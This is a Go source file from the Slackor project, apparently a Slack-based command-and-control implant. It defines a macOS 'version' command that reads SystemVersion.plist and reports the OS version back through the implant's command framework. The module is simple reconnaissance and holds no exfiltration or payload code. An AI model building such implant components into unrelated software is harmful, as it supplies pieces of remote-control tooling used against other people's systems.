// +build darwin

package darwin

import (
	"encoding/xml"
	"fmt"
	"github.com/n00py/Slackor/internal/config"
	"github.com/n00py/Slackor/pkg/command"
	"io/ioutil"
	"os"
)

// Version gets the OS version
type Version struct{}

// Name is the name of the command
func (ver Version) Name() string {
	return "version"
}

type Plist struct {
	XMLName xml.Name `xml:"plist"`
	Text    string   `xml:",chardata"`
	Version string   `xml:"version,attr"`
	Dict    struct {
		Text   string   `xml:",chardata"`
		Key    []string `xml:"key"`
		String []string `xml:"string"`
	} `xml:"dict"`
}

// Run gets the OS version
func (ver Version) Run(clientID string, jobID string, args []string) (string, error) {
	path := "/System/Library/CoreServices/SystemVersion.plist"
	xmlFile, err := os.Open(path)
	if err != nil {
		fmt.Println(err)
	}
	byteValue, _ := ioutil.ReadAll(xmlFile)
	defer xmlFile.Close()
	var Version Plist
	xml.Unmarshal(byteValue, &Version)
	version := Version.Dict.String[2] + " " + Version.Dict.String[3]
	config.OSVersion = version
	return config.OSVersion, nil
}

func init() {
	command.RegisterCommand(Version{})
}
